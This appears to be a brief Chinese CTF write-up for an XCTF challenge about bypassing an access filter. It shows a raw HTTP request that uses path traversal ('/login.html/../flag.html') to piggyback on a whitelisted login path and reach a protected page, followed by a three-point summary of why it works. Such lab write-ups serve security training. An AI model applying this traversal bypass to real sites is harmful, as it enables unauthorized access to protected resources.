---
title: filter设计缺陷导致的权限绕过
tags: [XCTF,权限绕过]
categories: [CTF]
---


```bash
GET /login.html/../flag.html HTTP/1.1 # 返回到根目录下 访问flag.html 
Host: 61.147.171.105:63076
Cache-Control: no-cache
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Pragma: no-cache
Upgrade-Insecure-Requests: 1
Cookie: JSESSIONID=C4A50FA26043136F4272E8E4B946C2C9; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1724942854; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1724942854; HMACCOUNT=D013441DFA61A5ED
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept-Encoding: gzip, deflate
```

# 总结

1. 必须要知道访问的html文件的路径
2. login是白名单
3. 通过`../`可以返回到根目录下